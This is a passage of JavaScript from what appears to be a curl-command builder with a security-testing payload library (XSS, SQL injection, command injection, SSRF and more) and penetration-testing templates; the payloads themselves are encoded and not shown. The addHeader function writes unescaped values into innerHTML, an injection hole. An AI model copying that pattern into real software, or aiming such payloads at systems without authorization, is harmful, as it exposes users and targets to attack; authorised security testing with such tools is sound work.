            if (config.body !== undefined) {
                document.getElementById('body').value = config.body;
            }

            // Set upload fields
            if (config.uploadField) {
                document.getElementById('upload-field').value = config.uploadField;
            }
            if (config.uploadFile) {
                document.getElementById('upload-file').value = config.uploadFile;
            }
            if (config.formData) {
                document.getElementById('form-data').value = config.formData;
            }

            generateCurl();
            showToast(`${template.replace('-', ' ')} template applied!`, 'success');
        }
    }

    function addHeader(name = '', value = '') {
        const container = document.getElementById('headers-container');
        const row = document.createElement('div');
        row.className = 'header-row';
        row.innerHTML = `
            <input type="text" class="header-input header-name" placeholder="Header name" value="${name}">
            <input type="text" class="header-input header-value" placeholder="Header value" value="${value}">
            <button class="btn btn-sm btn-danger remove-header" title="Remove this header">
                <i class="fas fa-trash"></i>
            </button>
        `;
        
        const inputs = row.querySelectorAll('input');
        inputs.forEach(input => {
            input.addEventListener('input', generateCurl);
        });
        
        container.appendChild(row);
    }

    function generateCurl() {
        let curl = 'curl';
        
        // Method
        if (currentMethod !== 'GET') {
            curl += ` -X ${currentMethod}`;
        }
        
        // URL
        const url = document.getElementById('url').value.trim();
        if (url) {
            curl += ` ${safeShellEscape(url)}`;
        }
        
        // Headers
        const headerRows = document.querySelectorAll('.header-row');
        headerRows.forEach(row => {
            const name = row.querySelector('.header-name').value.trim();
            const value = row.querySelector('.header-value').value.trim();
            if (name && value) {
                curl += ` -H ${safeShellEscape(name + ': ' + value)}`;
            }
        });

        // Authentication
        const authType = document.getElementById('auth-type').value;
        if (authType === 'basic') {
            const user = document.getElementById('auth-user')?.value;
            const pass = document.getElementById('auth-pass')?.value;
            if (user && pass) {
                curl += ` -u ${safeShellEscape(user + ':' + pass)}`;
            }
        } else if (authType === 'bearer') {
            const token = document.getElementById('auth-token')?.value;
            if (token) {
                curl += ` -H ${safeShellEscape('Authorization: Bearer ' + token)}`;
            }
        } else if (authType === 'api-key') {
            const keyName = document.getElementById('api-key-name')?.value;
            const keyValue = document.getElementById('api-key-value')?.value;
            if (keyName && keyValue) {
                curl += ` -H ${safeShellEscape(keyName + ': ' + keyValue)}`;
            }
        } else if (authType === 'digest') {
            const user = document.getElementById('digest-user')?.value;
            const pass = document.getElementById('digest-pass')?.value;
            if (user && pass) {
                curl += ` --digest -u ${safeShellEscape(user + ':' + pass)}`;
            }
        } else if (authType === 'ntlm') {
            const user = document.getElementById('ntlm-user')?.value;
            const pass = document.getElementById('ntlm-pass')?.value;
            if (user && pass) {
                curl += ` --ntlm -u ${safeShellEscape(user + ':' + pass)}`;
            }
        }

        // User Agent
        const userAgent = document.getElementById('user-agent').value;
        const customUserAgent = document.getElementById('custom-user-agent').value;
        if (userAgent && userAgent !== 'custom') {
            curl += ` -A ${safeShellEscape(userAgent)}`;
        } else if (userAgent === 'custom' && customUserAgent) {
            curl += ` -A ${safeShellEscape(customUserAgent)}`;
        }

        // Body
        const body = document.getElementById('body').value.trim();
        if (body && currentMethod !== 'GET' && currentMethod !== 'HEAD') {
            curl += ` -d ${safeShellEscape(body)}`;
        }

        // File upload
        const uploadField = document.getElementById('upload-field').value.trim();
        const uploadFile = document.getElementById('upload-file').value.trim();
        if (uploadField && uploadFile) {
            curl += ` -F ${safeShellEscape(uploadField + '=' + uploadFile)}`;
        }

        // Form data
        const formData = document.getElementById('form-data')?.value.trim();
        if (formData) {
            formData.split('\n').forEach(line => {
                const [field, value] = line.split('=');
                if (field && value) {
                    curl += ` -F ${safeShellEscape(field.trim() + '=' + value.trim())}`;
                }
            });
        }

        // Cookies
        const cookies = document.getElementById('cookies').value.trim();
        if (cookies) {
            curl += ` -b ${safeShellEscape(cookies)}`;
        }

        // Cookie jar
        const cookieJar = document.getElementById('cookie-jar').value.trim();
        if (cookieJar) {
            curl += ` -c ${safeShellEscape(cookieJar)}`;
        }

        // Cookie file
        const cookieFile = document.getElementById('cookie-file')?.value.trim();
        if (cookieFile) {
            curl += ` -b ${safeShellEscape(cookieFile)}`;
        }

        // Proxy
        const proxy = document.getElementById('proxy').value.trim();
        if (proxy) {
            curl += ` -x ${safeShellEscape(proxy)}`;
        }

        const socksProxy = document.getElementById('socks-proxy').value.trim();
        if (socksProxy) {
            curl += ` --socks5 ${safeShellEscape(socksProxy)}`;
        }

        const proxyUser = document.getElementById('proxy-user').value.trim();
        if (proxyUser) {
            curl += ` -U ${safeShellEscape(proxyUser)}`;
        }

        // Network interface
        const networkInterface = document.getElementById('interface').value.trim();
        if (networkInterface) {
            curl += ` --interface ${safeShellEscape(networkInterface)}`;
        }

        // SSL options
        const cacert = document.getElementById('cacert').value.trim();
        if (cacert) {
            curl += ` --cacert ${safeShellEscape(cacert)}`;
        }

        const cert = document.getElementById('cert').value.trim();
        if (cert) {
            curl += ` --cert ${safeShellEscape(cert)}`;
        }

        const key = document.getElementById('key')?.value.trim();
        if (key) {
            curl += ` --key ${safeShellEscape(key)}`;
        }

        // TLS version
        const tlsVersion = document.getElementById('tls-version')?.value;
        if (tlsVersion) {
            curl += ` ${tlsVersion}`;
        }

        // Timeouts
        const timeout = document.getElementById('timeout').value.trim();
        if (timeout) {
            curl += ` --max-time ${timeout}`;
        }

        const connectTimeout = document.getElementById('connect-timeout')?.value.trim();
        if (connectTimeout) {
            curl += ` --connect-timeout ${connectTimeout}`;
        }

        // Max redirects
        const maxRedirects = document.getElementById('max-redirects').value.trim();
        if (maxRedirects) {
            curl += ` --max-redirs ${maxRedirects}`;
        }

        // Retry
        const retry = document.getElementById('retry').value.trim();
        if (retry) {
            curl += ` --retry ${retry}`;
        }

        // Rate limiting
        const rateLimit = document.getElementById('rate-limit')?.value.trim();
        if (rateLimit) {
            curl += ` --limit-rate ${rateLimit}`;
        }

        // Output file
        const outputFile = document.getElementById('output-file').value.trim();
        if (outputFile) {
            curl += ` -o ${safeShellEscape(outputFile)}`;
        }

        // Dump headers
        const dumpHeader = document.getElementById('dump-header').value.trim();
        if (dumpHeader) {
            curl += ` -D ${safeShellEscape(dumpHeader)}`;
        }

        // Write out
        const writeOut = document.getElementById('write-out')?.value.trim();
        if (writeOut) {
            curl += ` -w ${safeShellEscape(writeOut)}`;
        }

        // Progress bar
        const progressBar = document.getElementById('progress-bar')?.value;
        if (progressBar) {
            curl += ` ${progressBar}`;
        }

        // Boolean options
        if (document.getElementById('opt-verbose').checked) curl += ' -v';
        if (document.getElementById('opt-silent').checked) curl += ' -s';
        if (document.getElementById('opt-show-error').checked) curl += ' -S';
        if (document.getElementById('opt-location').checked) curl += ' -L';
        if (document.getElementById('opt-compressed').checked) curl += ' --compressed';
        if (document.getElementById('opt-include').checked) curl += ' -i';
        if (document.getElementById('opt-head').checked) curl += ' -I';
        if (document.getElementById('opt-fail')?.checked) curl += ' --fail';
        if (document.getElementById('opt-insecure').checked) curl += ' -k';
        if (document.getElementById('opt-cert-status').checked) curl += ' --cert-status';
        if (document.getElementById('opt-http2').checked) curl += ' --http2';
        if (document.getElementById('opt-http3')?.checked) curl += ' --http3';
        if (document.getElementById('opt-proxy-tunnel')?.checked) curl += ' --proxytunnel';
        if (document.getElementById('opt-proxy-insecure')?.checked) curl += ' --proxy-insecure';
        
        document.getElementById('output').value = curl;
    }

    function copyCommand() {
        const output = document.getElementById('output');
        if (!output.value.trim()) {
            showToast('No command to copy!', 'warning');
            return;
        }
        
        navigator.clipboard.writeText(output.value).then(() => {
            showToast('Command copied to clipboard!', 'success');
        }).catch(() => {
            output.select();
            document.execCommand('copy');
            showToast('Command copied to clipboard!', 'success');
        });
    }

    function downloadCommand() {
        const curl = document.getElementById('output').value.trim();
        if (!curl) {
            showToast('No command to download!', 'warning');
            return;
        }
        
        const timestamp = new Date().toISOString().slice(0, 19).replace(/:/g, '-');
        const filename = `curl-command-${timestamp}.sh`;
        
        const content = `#!/bin/bash\n# Generated by CURL Commander Pro\n# ${new Date().toLocaleString()}\n\n${curl}\n`;
        
        const blob = new Blob([content], { type: 'text/plain' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = filename;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
        
        showToast('Command downloaded as shell script!', 'success');
    }

    function shareCommand() {
        const curl = document.getElementById('output').value.trim();
        if (!curl) {
            showToast('No command to share!', 'warning');
            return;
        }
        
        if (navigator.share) {
            navigator.share({
                title: 'CURL Command',
                text: curl
            }).then(() => {
                showToast('Command shared successfully!', 'success');
            }).catch(() => {
                copyCommand(); // Fallback to copy
            });
        } else {
            copyCommand(); // Fallback to copy
        }
    }

    function saveCommand() {
        const curl = document.getElementById('output').value.trim();
        if (!curl) {
            showToast('No command to save!', 'warning');
            return;
        }
        
        const timestamp = new Date().toLocaleString();
        const command = {
            id: Date.now(),
            command: curl,
            timestamp: timestamp,
            method: currentMethod,
            url: document.getElementById('url').value.trim(),
            description: `${currentMethod} request to ${new URL(document.getElementById('url').value || 'https://example.com').hostname}`
        };
        
        savedCommands.unshift(command);
        if (savedCommands.length > 100) {
            savedCommands = savedCommands.slice(0, 100);
        }
        
        localStorage.setItem('curlCommands', JSON.stringify(savedCommands));
        updateSavedCommands();
        showToast('Command saved to history!', 'success');
    }

    function updateSavedCommands() {
        const container = document.getElementById('saved-commands');
        const countBadge = document.getElementById('saved-count');
        
        countBadge.textContent = savedCommands.length;
        
        if (savedCommands.length === 0) {
            container.innerHTML = `
                <div style="padding: 1.5rem; text-align: center; color: var(--gray-500);">
                    <i class="fas fa-bookmark" style="font-size: 2rem; margin-bottom: 0.5rem; opacity: 0.3;"></i><br>
                    No saved commands yet<br>
                    <small>Use the Save button to store your commands</small>
                </div>
            `;
            return;
        }
        
        container.innerHTML = '';
        savedCommands.forEach(cmd => {
            const div = document.createElement('div');
            div.style.cssText = `
                padding: 1rem;
                border-bottom: 1px solid var(--gray-200);
                display: flex;
                justify-content: space-between;
                align-items: center;
                transition: background 0.2s ease;
            `;
            div.addEventListener('mouseenter', () => div.style.background = 'var(--gray-50)');
            div.addEventListener('mouseleave', () => div.style.background = 'transparent');
            
            const contentDiv = document.createElement('div');
            contentDiv.style.cssText = 'flex: 1; margin-right: 1rem;';
            
            const commandDiv = document.createElement('div');
            commandDiv.style.cssText = `
                font-family: 'Monaco', 'Consolas', 'SF Mono', monospace;
                font-size: 0.75rem;
                color: var(--gray-700);
                white-space: nowrap;
                overflow: hidden;
                text-overflow: ellipsis;
                background: var(--gray-50);
                padding: 0.5rem;
                border-radius: 4px;
                margin-bottom: 0.5rem;
            `;
            commandDiv.textContent = cmd.command;
            commandDiv.title = cmd.command;
            
            const metaDiv = document.createElement('div');
            metaDiv.style.cssText = 'font-size: 0.75rem; color: var(--gray-500);';
            metaDiv.textContent = `${cmd.description}  ${cmd.timestamp}`;
            
            const actionsDiv = document.createElement('div');
            actionsDiv.style.cssText = 'display: flex; gap: 0.5rem; flex-shrink: 0;';
            
            const copyBtn = document.createElement('button');
            copyBtn.className = 'btn btn-sm btn-secondary';
            copyBtn.innerHTML = '<i class="fas fa-copy"></i>';
            copyBtn.title = 'Copy command';
            copyBtn.onclick = () => {
                navigator.clipboard.writeText(cmd.command).then(() => {
                    showToast('Command copied!', 'success');
                });
            };
            
            const loadBtn = document.createElement('button');
            loadBtn.className = 'btn btn-sm btn-info';
            loadBtn.innerHTML = '<i class="fas fa-upload"></i>';
            loadBtn.title = 'Load command';
            loadBtn.onclick = () => {
                document.getElementById('output').value = cmd.command;
                showToast('Command loaded!', 'success');
            };
            
            const deleteBtn = document.createElement('button');
            deleteBtn.className = 'btn btn-sm btn-danger';
            deleteBtn.innerHTML = '<i class="fas fa-trash"></i>';
            deleteBtn.title = 'Delete command';
            deleteBtn.onclick = () => deleteSavedCommand(cmd.id);
            
            contentDiv.appendChild(commandDiv);
            contentDiv.appendChild(metaDiv);
            actionsDiv.appendChild(copyBtn);
            actionsDiv.appendChild(loadBtn);
            actionsDiv.appendChild(deleteBtn);
            div.appendChild(contentDiv);
            div.appendChild(actionsDiv);
            container.appendChild(div);
        });
    }

    function deleteSavedCommand(id) {
        if (confirm('Delete this saved command?')) {
            savedCommands = savedCommands.filter(cmd => cmd.id !== id);
            localStorage.setItem('curlCommands', JSON.stringify(savedCommands));
            updateSavedCommands();
            showToast('Command deleted!', 'success');
        }
    }

    function clearSavedCommands() {
        if (savedCommands.length === 0) {
            showToast('No commands to clear!', 'warning');
            return;
        }
        
        if (confirm('Are you sure you want to clear all saved commands? This action cannot be undone.')) {
            savedCommands = [];
            localStorage.setItem('curlCommands', JSON.stringify(savedCommands));
            updateSavedCommands();
            showToast('All commands cleared!', 'success');
        }
    }

    function resetAll() {
        if (confirm('Reset all form fields to default values? This will clear your current configuration.')) {
            // Reset basic fields
            document.getElementById('url').value = 'https://api.example.com/v1/test';
            document.getElementById('body').value = '';
            
            // Reset method
            document.querySelectorAll('.method-btn').forEach(btn => btn.classList.remove('active'));
            document.querySelector('[data-method="GET"]').classList.add('active');
            currentMethod = 'GET';
            
            // Reset headers
            const container = document.getElementById('headers-container');
            container.innerHTML = `
                <div class="header-row">
                    <input type="text" class="header-input header-name" placeholder="Header name" value="Content-Type">
                    <input type="text" class="header-input header-value" placeholder="Header value" value="application/json">
                    <button class="btn btn-sm btn-danger remove-header" title="Remove this header">
                        <i class="fas fa-trash"></i>
                    </button>
                </div>
            `;
            
            // Add event listeners to new header inputs
            container.querySelectorAll('input').forEach(input => {
                input.addEventListener('input', generateCurl);
            });
            
            // Reset all other fields
            document.querySelectorAll('input:not([type="checkbox"]), select, textarea').forEach(field => {
                if (field.type === 'number') {
                    if (field.id === 'timeout') field.value = '30';
                    else if (field.id === 'max-redirects') field.value = '5';
                    else if (field.id === 'connect-timeout') field.value = '10';
                    else if (field.id === 'retry') field.value = '0';
                    else field.value = '';
                } else if (field.id !== 'url' && field.id !== 'output' && !field.classList.contains('header-input')) {
                    field.value = '';
                }
            });
            
            // Reset checkboxes
            document.querySelectorAll('input[type="checkbox"]').forEach(checkbox => {
                checkbox.checked = checkbox.id === 'opt-verbose' || checkbox.id === 'opt-location';
            });
            
            // Reset auth fields
            document.getElementById('auth-fields').innerHTML = '';
            
            // Close all collapsibles except first
            document.querySelectorAll('.collapsible').forEach((collapsible, index) => {
                if (index === 0) {
                    collapsible.classList.add('active');
                } else {
                    collapsible.classList.remove('active');
                }
            });
            
            generateCurl();
            showToast('All settings reset to defaults!', 'success');
        }
    }

    function formatJSON() {
        const bodyInput = document.getElementById('body');
        const body = bodyInput.value.trim();
        
        if (!body) {
            showToast('No content to format!', 'warning');
            return;
        }
        
        try {
            const parsed = JSON.parse(body);
            bodyInput.value = JSON.stringify(parsed, null, 2);
            generateCurl();
            showToast('JSON formatted successfully!', 'success');
        } catch (e) {
            showToast('Invalid JSON format! Please check your syntax.', 'error');
        }
    }

    function encodeBody() {
        const bodyInput = document.getElementById('body');
        const body = bodyInput.value.trim();
        
        if (!body) {
            showToast('No content to encode!', 'warning');
            return;
        }
        
        bodyInput.value = encodeURIComponent(body);
        generateCurl();
        showToast('Content URL encoded!', 'success');
    }

    function decodeBody() {
        const bodyInput = document.getElementById('body');
        const body = bodyInput.value.trim();
        
        if (!body) {
            showToast('No content to decode!', 'warning');
            return;
        }
        
        try {
            bodyInput.value = decodeURIComponent(body);
            generateCurl();
            showToast('Content URL decoded!', 'success');
        } catch (e) {
            showToast('Invalid URL encoding!', 'error');
        }
    }

    function base64EncodeBody() {
        const bodyInput = document.getElementById('body');
        const body = bodyInput.value.trim();
        
        if (!body) {
            showToast('No content to encode!', 'warning');
            return;
        }
        
        try {
            bodyInput.value = btoa(body);
            generateCurl();
            showToast('Content Base64 encoded!', 'success');
        } catch (e) {
            showToast('Failed to encode content!', 'error');
        }
    }

    function displayPayloads(category) {
        const container = document.getElementById('payload-list');
        const countBadge = document.getElementById('payload-count');
        container.innerHTML = '';
        
        let allPayloads = [];
        
        if (category === 'all') {
            for (const cat in payloadDatabase) {
                allPayloads = allPayloads.concat(
                    payloadDatabase[cat].map(encodedPayload => ({
                        category: cat,
                        payload: decodePayload(encodedPayload)
                    }))
                );
            }
        } else if (payloadDatabase[category]) {
            allPayloads = payloadDatabase[category].map(encodedPayload => ({
                category: category,
                payload: decodePayload(encodedPayload)
            }));
        }
        
        countBadge.textContent = allPayloads.length;
        
        if (allPayloads.length === 0) {
            container.innerHTML = `
                <div style="padding: 1.5rem; text-align: center; color: var(--gray-500);">
                    <i class="fas fa-database" style="font-size: 2rem; margin-bottom: 0.5rem; opacity: 0.3;"></i><br>
                    No payloads found<br>
                    <small>Try selecting a different category</small>
                </div>
            `;
            return;
        }
        
        allPayloads.forEach((item, index) => {
            const element = document.createElement('div');
            element.className = 'payload-item';
            
            const textDiv = document.createElement('div');
            textDiv.className = 'payload-text';
            textDiv.textContent = item.payload;
            textDiv.title = `${item.category.toUpperCase()}: ${item.payload}`;
            
            const actionsDiv = document.createElement('div');
            actionsDiv.className = 'payload-actions';
            
            const categoryBadge = document.createElement('span');
            categoryBadge.className = 'badge badge-primary';
            categoryBadge.textContent = item.category.toUpperCase();
            categoryBadge.style.fontSize = '0.6rem';
            categoryBadge.style.marginRight = '0.5rem';
            
            const copyBtn = document.createElement('button');
            copyBtn.className = 'btn btn-sm btn-secondary';
            copyBtn.innerHTML = '<i class="fas fa-copy"></i>';
            copyBtn.title = 'Copy payload';
            copyBtn.onclick = () => {
                navigator.clipboard.writeText(item.payload).then(() => {
                    showToast(`${item.category.toUpperCase()} payload copied!`, 'success');
                });
            };
            
            const useBtn = document.createElement('button');
            useBtn.className = 'btn btn-sm btn-primary';
            useBtn.innerHTML = '<i class="fas fa-plus"></i>';
            useBtn.title = 'Add to request body';
            useBtn.onclick = () => {
                document.getElementById('body').value = item.payload;
                generateCurl();
                showToast(`${item.category.toUpperCase()} payload added to request body!`, 'success');
            };
            
            actionsDiv.appendChild(categoryBadge);
            actionsDiv.appendChild(copyBtn);
            actionsDiv.appendChild(useBtn);
            element.appendChild(textDiv);
            element.appendChild(actionsDiv);
            container.appendChild(element);
        });
    }

    function searchPayloads(query) {
        if (!query.trim()) {
            displayPayloads(currentCategory);
            return;
        }
        
        query = query.toLowerCase();
        
        let allPayloads = [];
        for (const cat in payloadDatabase) {
            if (currentCategory === 'all' || currentCategory === cat) {
                allPayloads = allPayloads.concat(
                    payloadDatabase[cat]
                        .map(encodedPayload => decodePayload(encodedPayload))
                        .filter(payload => 
                            payload.toLowerCase().includes(query) || 
                            cat.toLowerCase().includes(query)
                        )
                        .map(payload => ({ category: cat, payload }))
                );
            }
        }
        
        const container = document.getElementById('payload-list');
        const countBadge = document.getElementById('payload-count');
        
        countBadge.textContent = allPayloads.length;
        container.innerHTML = '';
        
        if (allPayloads.length === 0) {
            container.innerHTML = `
                <div style="padding: 1.5rem; text-align: center; color: var(--gray-500);">
                    <i class="fas fa-search" style="font-size: 2rem; margin-bottom: 0.5rem; opacity: 0.3;"></i><br>
                    No matching payloads found<br>
                    <small>Try different search terms</small>
                </div>
            `;
            return;
        }
        
        allPayloads.forEach((item, index) => {
            const element = document.createElement('div');
            element.className = 'payload-item';
            
            const textDiv = document.createElement('div');
            textDiv.className = 'payload-text';
            textDiv.textContent = item.payload;
            textDiv.title = `${item.category.toUpperCase()}: ${item.payload}`;
            
            const actionsDiv = document.createElement('div');
            actionsDiv.className = 'payload-actions';
            
            const categoryBadge = document.createElement('span');
            categoryBadge.className = 'badge badge-primary';
            categoryBadge.textContent = item.category.toUpperCase();
            categoryBadge.style.fontSize = '0.6rem';
            categoryBadge.style.marginRight = '0.5rem';
            
            const copyBtn = document.createElement('button');
            copyBtn.className = 'btn btn-sm btn-secondary';
            copyBtn.innerHTML = '<i class="fas fa-copy"></i>';
            copyBtn.title = 'Copy payload';
            copyBtn.onclick = () => {
                navigator.clipboard.writeText(item.payload).then(() => {
                    showToast(`${item.category.toUpperCase()} payload copied!`, 'success');
                });
            };
            
            const useBtn = document.createElement('button');
            useBtn.className = 'btn btn-sm btn-primary';
            useBtn.innerHTML = '<i class="fas fa-plus"></i>';
            useBtn.title = 'Add to request body';
            useBtn.onclick = () => {
                document.getElementById('body').value = item.payload;
                generateCurl();
                showToast(`${item.category.toUpperCase()} payload added to request body!`, 'success');
            };
            
            actionsDiv.appendChild(categoryBadge);
            actionsDiv.appendChild(copyBtn);
            actionsDiv.appendChild(useBtn);
            element.appendChild(textDiv);
            element.appendChild(actionsDiv);
            container.appendChild(element);
        });
    }

    function loadTemplates() {
        const templatesModal = document.getElementById('templates-modal');
        const modalBody = templatesModal.querySelector('.modal-body');
        
        const templatesHTML = `
            <div class="template-grid" style="grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 1.5rem; margin-top: 1rem;">
                <div class="template-card" data-template="api-test" style="padding: 1.5rem;">
                    <div class="template-icon" style="font-size: 2rem; margin-bottom: 1rem;">
                        <i class="fas fa-cloud"></i>
                    </div>
                    <div class="template-title" style="font-size: 1.125rem; margin-bottom: 0.5rem;">REST API Testing</div>
                    <div class="template-description" style="margin-bottom: 1rem;">Complete setup for testing REST APIs with JSON payloads and authentication headers.</div>
                    <div style="font-size: 0.75rem; color: var(--gray-500);">
                         POST method<br>
                         JSON content type<br>
                         Bearer token auth<br>
                         Sample JSON body
                    </div>
                </div>
                
                <div class="template-card" data-template="form-test" style="padding: 1.5rem;">
                    <div class="template-icon" style="font-size: 2rem; margin-bottom: 1rem;">
                        <i class="fas fa-wpforms"></i>
                    </div>
                    <div class="template-title" style="font-size: 1.125rem; margin-bottom: 0.5rem;">HTML Form Testing</div>
                    <div class="template-description" style="margin-bottom: 1rem;">Perfect for testing web form submissions and login pages.</div>
                    <div style="font-size: 0.75rem; color: var(--gray-500);">
                         POST method<br>
                         Form URL encoded<br>
                         Sample credentials<br>
                         CSRF protection
                    </div>
                </div>
                
                <div class="template-card" data-template="auth-test" style="padding: 1.5rem;">
                    <div class="template-icon" style="font-size: 2rem; margin-bottom: 1rem;">
                        <i class="fas fa-key"></i>
                    </div>
                    <div class="template-title" style="font-size: 1.125rem; margin-bottom: 0.5rem;">Authentication Bypass</div>
                    <div class="template-description" style="margin-bottom: 1rem;">Test authentication mechanisms and session management.</div>
                    <div style="font-size: 0.75rem; color: var(--gray-500);">
                         Session cookies<br>
                         Custom headers<br>
                         Admin endpoints<br>
                         Browser simulation
                    </div>
                </div>
                
                <div class="template-card" data-template="upload-test" style="padding: 1.5rem;">
                    <div class="template-icon" style="font-size: 2rem; margin-bottom: 1rem;">
                        <i class="fas fa-upload"></i>
                    </div>
                    <div class="template-title" style="font-size: 1.125rem; margin-bottom: 0.5rem;">File Upload Testing</div>
                    <div class="template-description" style="margin-bottom: 1rem;">Test file upload functionality and potential vulnerabilities.</div>
                    <div style="font-size: 0.75rem; color: var(--gray-500);">
                         Multipart form data<br>
                         File upload field<br>
                         Additional form fields<br>
                         Security payloads
                    </div>
                </div>
                
                <div class="template-card" data-template="proxy-test" style="padding: 1.5rem;">
                    <div class="template-icon" style="font-size: 2rem; margin-bottom: 1rem;">
                        <i class="fas fa-server"></i>
                    </div>
                    <div class="template-title" style="font-size: 1.125rem; margin-bottom: 0.5rem;">Proxy Testing</div>
                    <div class="template-description" style="margin-bottom: 1rem;">Route requests through proxies for testing and analysis.</div>
                    <div style="font-size: 0.75rem; color: var(--gray-500);">
                         HTTP proxy setup<br>
                         Burp Suite integration<br>
                         SSL verification off<br>
                         Verbose output
                    </div>
                </div>
                
                <div class="template-card" data-template="ssl-test" style="padding: 1.5rem;">
                    <div class="template-icon" style="font-size: 2rem; margin-bottom: 1rem;">
                        <i class="fas fa-shield-alt"></i>
                    </div>
                    <div class="template-title" style="font-size: 1.125rem; margin-bottom: 0.5rem;">SSL/TLS Testing</div>
                    <div class="template-description" style="margin-bottom: 1rem;">Test SSL certificate validation and TLS configurations.</div>
                    <div style="font-size: 0.75rem; color: var(--gray-500);">
                         Custom CA certificates<br>
                         Client certificates<br>
                         TLS version control<br>
                         Certificate verification
                    </div>
                </div>
            </div>
        `;
        
        // Replace the existing template content
        const existingContent = modalBody.querySelector('.help-tip');
        modalBody.innerHTML = '';
        modalBody.appendChild(existingContent.cloneNode(true));
        modalBody.insertAdjacentHTML('beforeend', templatesHTML);
        
        // Add event listeners to template cards
        modalBody.querySelectorAll('.template-card').forEach(card => {
            card.addEventListener('click', () => {
                const template = card.getAttribute('data-template');
                applyTemplate(template);
                hideModal('templates-modal');
            });
        });
    }

    function showModal(modalId) {
        const modal = document.getElementById(modalId);
        if (modal) {
            modal.classList.add('show');
            document.body.style.overflow = 'hidden';
            
            // Load help content if it's the help modal
            if (modalId === 'help-modal') {
                loadHelpContent();
            }
        }
    }

    function hideModal(modalId) {
        const modal = document.getElementById(modalId);
        if (modal) {
            modal.classList.remove('show');
            document.body.style.overflow = 'auto';
        }
    }

    function loadHelpContent() {
        const helpModal = document.getElementById('help-modal');
        const modalBody = helpModal.querySelector('.modal-body');
        
        const helpHTML = `
            <div class="help-section" style="margin-bottom: 2rem;">
                <h3 style="color: var(--primary); margin-bottom: 1rem; display: flex; align-items: center; gap: 0.5rem;">
                    <i class="fas fa-rocket"></i> Getting Started
                </h3>
                <div style="font-size: 0.875rem; line-height: 1.6; color: var(--gray-700);">
                    <p><strong>1. Basic Setup:</strong> Enter your target URL and select the appropriate HTTP method (GET for reading data, POST for sending data, PUT for updates, DELETE for removal).</p>
                    <p><strong>2. Add Headers:</strong> Include necessary headers like Content-Type, Authorization, or custom API headers. Use the preset buttons for common configurations.</p>
                    <p><strong>3. Configure Authentication:</strong> Set up authentication using Basic Auth, Bearer tokens, API keys, or other methods as required by your target API.</p>
                    <p><strong>4. Add Payload:</strong> Include request body data or choose from our security testing payload library for vulnerability assessment.</p>
                    <p><strong>5. Generate & Test:</strong> Click "Generate Command" to create your CURL command, then copy and run it in your terminal.</p>
                </div>
            </div>

            <div class="help-section" style="margin-bottom: 2rem;">
                <h3 style="color: var(--success); margin-bottom: 1rem; display: flex; align-items: center; gap: 0.5rem;">
                    <i class="fas fa-shield-alt"></i> Security Testing Guide
                </h3>
                <div style="font-size: 0.875rem; line-height: 1.6; color: var(--gray-700);">
                    <p><strong>Payload Categories:</strong></p>
                    <ul style="margin-left: 1rem; margin-bottom: 1rem;">
                        <li><strong>XSS:</strong> Cross-Site Scripting payloads for testing input sanitization</li>
                        <li><strong>SQL Injection:</strong> Database injection payloads for testing query security</li>
                        <li><strong>XXE:</strong> XML External Entity payloads for XML processing vulnerabilities</li>
                        <li><strong>Command Injection:</strong> OS command execution payloads</li>
                        <li><strong>Path Traversal:</strong> Directory traversal and file inclusion payloads</li>
                        <li><strong>SSTI:</strong> Server-Side Template Injection payloads</li>
                        <li><strong>SSRF:</strong> Server-Side Request Forgery payloads</li>
                        <li><strong>NoSQL:</strong> NoSQL database injection payloads</li>
                        <li><strong>LFI:</strong> Local File Inclusion payloads</li>
                    </ul>
                    <p><strong>Testing Methodology:</strong> Start with basic requests, then gradually introduce security payloads. Always test with proper authorization and in controlled environments.</p>
                </div>
            </div>

            <div class="help-section" style="margin-bottom: 2rem;">
                <h3 style="color: var(--info); margin-bottom: 1rem; display: flex; align-items: center; gap: 0.5rem;">
                    <i class="fas fa-terminal"></i> CURL Command Reference
                </h3>
                <div style="font-size: 0.875rem; line-height: 1.6; color: var(--gray-700);">
                    <div style="background: var(--gray-50); padding: 1rem; border-radius: 8px; margin-bottom: 1rem;">
                        <p><strong>Essential Options:</strong></p>
                        <code style="display: block; margin: 0.5rem 0;">-X METHOD</code> - Specify HTTP method<br>
                        <code style="display: block; margin: 0.5rem 0;">-H "Header: Value"</code> - Add custom header<br>
                        <code style="display: block; margin: 0.5rem 0;">-d "data"</code> - Send POST data<br>
                        <code style="display: block; margin: 0.5rem 0;">-v</code> - Verbose output (show request/response details)<br>
                        <code style="display: block; margin: 0.5rem 0;">-k</code> - Ignore SSL certificate errors<br>
                        <code style="display: block; margin: 0.5rem 0;">-L</code> - Follow redirects<br>
                        <code style="display: block; margin: 0.5rem 0;">-o filename</code> - Save output to file
                    </div>
                    <div style="background: var(--gray-50); padding: 1rem; border-radius: 8px; margin-bottom: 1rem;">
                        <p><strong>Authentication Options:</strong></p>
                        <code style="display: block; margin: 0.5rem 0;">-u user:pass</code> - Basic authentication<br>
                        <code style="display: block; margin: 0.5rem 0;">--digest -u user:pass</code> - Digest authentication<br>
                        <code style="display: block; margin: 0.5rem 0;">-H "Authorization: Bearer token"</code> - Bearer token<br>
                        <code style="display: block; margin: 0.5rem 0;">--ntlm -u user:pass</code> - NTLM authentication
                    </div>
                    <div style="background: var(--gray-50); padding: 1rem; border-radius: 8px;">
                        <p><strong>Advanced Options:</strong></p>
                        <code style="display: block; margin: 0.5rem 0;">-x proxy:port</code> - Use HTTP proxy<br>
                        <code style="display: block; margin: 0.5rem 0;">--socks5 proxy:port</code> - Use SOCKS5 proxy<br>
                        <code style="display: block; margin: 0.5rem 0;">-F "field=@file"</code> - Upload file<br>
                        <code style="display: block; margin: 0.5rem 0;">-b "cookies"</code> - Send cookies<br>
                        <code style="display: block; margin: 0.5rem 0;">-c cookiejar</code> - Save cookies to file<br>
                        <code style="display: block; margin: 0.5rem 0;">--max-time 30</code> - Set timeout
                    </div>
                </div>
            </div>

            <div class="help-section" style="margin-bottom: 2rem;">
                <h3 style="color: var(--warning); margin-bottom: 1rem; display: flex; align-items: center; gap: 0.5rem;">
                    <i class="fas fa-exclamation-triangle"></i> Best Practices & Tips
                </h3>
                <div style="font-size: 0.875rem; line-height: 1.6; color: var(--gray-700);">
                    <p><strong>Security Testing:</strong></p>
                    <ul style="margin-left: 1rem; margin-bottom: 1rem;">
                        <li>Always obtain proper authorization before testing</li>
                        <li>Test in development or staging environments first</li>
